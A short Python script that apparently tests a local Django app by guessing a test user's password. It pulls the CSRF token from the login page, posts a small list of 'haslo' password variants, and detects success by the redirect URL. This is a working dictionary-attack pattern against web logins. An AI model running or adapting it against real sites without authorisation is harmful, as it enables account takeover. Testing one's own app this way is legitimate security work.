import requests

# Define the base URL of your Django application
BASE_URL = "http://127.0.0.1:8000"  # Replace with the actual URL of your app if hosted online

# Define the endpoint for login
LOGIN_URL = f"{BASE_URL}/app/"
CORRECT_URL = f"{BASE_URL}/app/tasks/"

# Username and passwords to test
USERNAME = "test2"
PASSWORDS = ['haslo', 'haslo123', 'haslo12', 'haslo1']

# Session to persist cookies (e.g., CSRF token)
session = requests.Session()

def get_csrf_token(url):
    """
    Retrieve the CSRF token from the login page.
    """
    response = session.get(url)
    if response.status_code == 200:
        # Parse the CSRF token from the HTML
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "csrfmiddlewaretoken"}).get("value")
        return csrf_token
    else:
        print(f"Failed to load the login page. Status code: {response.status_code}")
        return None

def try_password(username, password, csrf_token):
    """
    Attempt to log in with a given username and password.
    """
    payload = {
        "csrfmiddlewaretoken": csrf_token,
        "username": username,
        "password": password,
        "signin": "Sign in",  # Name of the button from your form
    }
    headers = {
        "Referer": LOGIN_URL  # Include Referer header as required by Django's CSRF validation
    }
    response = session.post(LOGIN_URL, data=payload, headers=headers)
    return response

def main():
    # Get the CSRF token
    csrf_token = get_csrf_token(LOGIN_URL)
    if not csrf_token:
        print("Could not retrieve CSRF token. Exiting.")
        return

    # Iterate through the passwords
    for password in PASSWORDS:
        print(f"Trying password: {password}")
        response = try_password(USERNAME, password, csrf_token)
        print(str(response.url))
        print(CORRECT_URL)
        
        # Check if login was successful
        if str(response.url) == CORRECT_URL:  # Redirect URL after a successful login
            print(f"Password found: {password}")
            break
        else:
            print(f"Password {password} failed.")
    else:
        print("No valid password found.")


main()